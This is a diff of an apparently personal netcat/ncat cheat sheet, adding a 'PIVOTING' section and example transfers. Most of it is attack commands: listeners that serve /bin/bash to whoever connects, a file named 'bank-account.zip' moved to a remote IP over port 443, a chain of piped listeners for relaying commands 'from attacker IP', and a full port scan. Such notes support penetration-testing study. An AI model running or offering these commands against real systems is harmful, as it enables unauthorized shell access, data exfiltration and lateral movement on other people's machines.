@@ -41,18 +41,32 @@ ncat -vlp 1234
 (connect with encryption)
 ncat -vv 127.0.0.1 1234 -e /bin/bash
 
-
-
-
-
-
+OTHER EXAMPLES:
 nc -l -p 443 < C:\bank-account.zip --from machine that has the file, this one is windows.
 
 nc -w3 192.168.31.201 443 > C:\bank-account.zip
 
 ###############################
+4) PIVOTING
+(listener 1)
+ncat -vlp 4444 -e /bin/bash
 
+(listener 2 and piper)
+nc -vlp 1234 | nc -nv 127.0.0.1 4444 | nc -vv 127.0.0.1 5555
+(start this listener above, it is important as a listener)
 
+(listener 3)
+nc -vlp 5555
+
+(connecting from attacker IP to listener 2)
+nc -nv 127.0.0.1 1234 
+(enter)
+ls
+(get the contents of the desktop from port 5555 that's listening)
+
+Connector runs commands on machine connected to port 1234, this gets piped to the machine listening on port 4444, who's output gets piped to the machine listening on port 5555 where resulting commands are displayed). Again commands are ran from the connector, but are displayed on machine listening on port 5555. 
+
+#############################
 Port Scan for open ports
 
 nc -z -v 172.16.1.15 1-65535 2>&1 | grep succeeded
